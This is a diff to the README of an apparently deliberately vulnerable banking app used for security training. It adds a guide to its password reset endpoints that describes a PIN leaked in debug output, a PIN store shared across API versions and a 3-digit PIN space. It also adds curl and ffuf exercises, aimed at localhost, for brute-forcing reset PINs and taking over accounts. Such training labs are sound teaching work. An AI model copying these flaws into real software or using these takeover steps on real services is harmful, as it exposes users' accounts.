@@ -24,7 +24,7 @@ This project is a simple banking application with multiple security vulnerabilit
 - 📝 Loan Requests
 - 👤 Profile Picture Upload
 - 📊 Transaction History
-- 🔑 Password Reset System (3-digit PIN)
+- 🔑 Password Reset System (multiple API versions with intentional vulnerabilities)
 - 💳 Virtual Cards Management
 - 📱 Bill Payments System
 - 🤖 AI Customer Support Agent (Real LLM with DeepSeek API / Mock Mode)
@@ -39,7 +39,7 @@ This project is a simple banking application with multiple security vulnerabilit
    - Broken object level authorization (BOLA)
    - Broken object property level authorization (BOPLA)
    - Mass Assignment & Excessive Data Exposure
-   - Weak password reset mechanism (3-digit PIN)
+   - Weak password reset mechanism — multiple vulnerable API versions (v1/v2/v3)
    - Token stored in localStorage
    - No server-side token invalidation
    - No session expiration
@@ -299,10 +299,80 @@ The application uses PostgreSQL. The database will be automatically initialized 
 
 ### Authentication Testing
 1. SQL Injection in login
-2. Weak password reset (bruteforce 3-digit PIN)
+2. Weak password reset — see [Password Reset Endpoint Guide](#password-reset-endpoint-guide) below
 3. JWT token manipulation
 4. Username enumeration
 5. Token storage vulnerabilities
+
+### Password Reset Endpoint Guide
+
+The app exposes **four password reset entry points**, each representing a progressively "fixed" version of the feature. Each still has exploitable flaws — that's intentional.
+
+| Endpoint | PIN Digits | Debug Exposure | Core Vulnerability |
+|---|---|---|---|
+| `POST /api/v1/forgot-password` | 3-digit | ✅ PIN returned in `debug_info.pin` field | Full PIN leaked in API response — no email needed |
+| `POST /api/v1/reset-password` | 3-digit | ✅ Yes | Brute-forceable: only 1,000 combinations (000–999) |
+| `POST /api/v2/forgot-password` | 3-digit | ❌ No leak | Looks fixed — but shares the same PIN store as v1 |
+| `POST /api/v2/reset-password` | 3-digit | ❌ No | Cross-version attack: PIN from v1 works here |
+| `POST /api/v3/forgot-password` | 4-digit | ❌ No | Stronger PIN space (10,000 combinations) — but still a Zombie API |
+| `POST /forgot-password` | 3-digit | ✅ Yes | Independent route with identical behaviour to v1 |
+
+#### Why multiple versions?
+
+These are deliberate **Zombie APIs** (OWASP API9) — old versions left running alongside newer ones. They model a realistic scenario where a dev team patches the latest version but forgets to retire or patch the older routes.
+
+- **v1** → "Legacy, leaky": Exposes the reset PIN directly in the JSON response body under `debug_info.pin`. The attacker never needs access to the user's email.
+- **v2** → "Partially patched": Removes the debug leak, but v1 and v2 share the same backend PIN store. A PIN generated via v1 can be redeemed via v2.
+- **v3** → "Improved": Switches to a 4-digit PIN (10× harder to brute-force) and masks the PIN in the response. Still a Zombie API — it should not co-exist with v1/v2.
+
+#### Exercises by version
+
+**Exercise A — Exploit debug info leakage (v1)**
+```bash
+# Step 1: trigger a reset and read the PIN straight from the response
+curl -s -X POST http://localhost:5000/api/v1/forgot-password \
+  -H "Content-Type: application/json" \
+  -d '{"username": "victim"}'
+# Response includes: "debug_info": {"pin": "042"} 
+
+# Step 2: use the leaked PIN to take over the account
+curl -s -X POST http://localhost:5000/api/v1/reset-password \
+  -H "Content-Type: application/json" \
+  -d '{"username": "victim", "pin": "042", "new_password": "hacked123"}'
+```
+
+**Exercise B — Brute-force the 3-digit PIN (v1 or v2)**
+```bash
+# Only 1,000 combinations — run with ffuf or Burp Intruder
+ffuf -u http://localhost:5000/api/v1/reset-password \
+  -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"username": "victim", "pin": "FUZZ", "new_password": "hacked"}' \
+  -w <(seq -w 0 999 | awk '{printf "%03d\n", $1}') \
+  -mc 200
+```
+
+**Exercise C — Cross-version attack (v1 PIN → v2 redemption)**
+```bash
+# Step 1: leak PIN via v1 (which exposes debug_info)
+curl -s -X POST http://localhost:5000/api/v1/forgot-password \
+  -H "Content-Type: application/json" \
+  -d '{"username": "victim"}'
+# Note the PIN from debug_info
+
+# Step 2: redeem it via v2 (which looks "secure" but shares the same store)
+curl -s -X POST http://localhost:5000/api/v2/reset-password \
+  -H "Content-Type: application/json" \
+  -d '{"username": "victim", "pin": "<PIN_FROM_STEP_1>", "new_password": "hacked123"}'
+```
+
+**Exercise D — Compare PIN strength across versions**
+
+| Version | PIN space | Time to brute-force (10 req/s) |
+|---|---|---|
+| v1 / v2 | 10³ = 1,000 | ~100 seconds |
+| v3 | 10⁴ = 10,000 | ~1,000 seconds |
+
 
 ### Authorization Testing
 1. Access other users' transaction history via account number
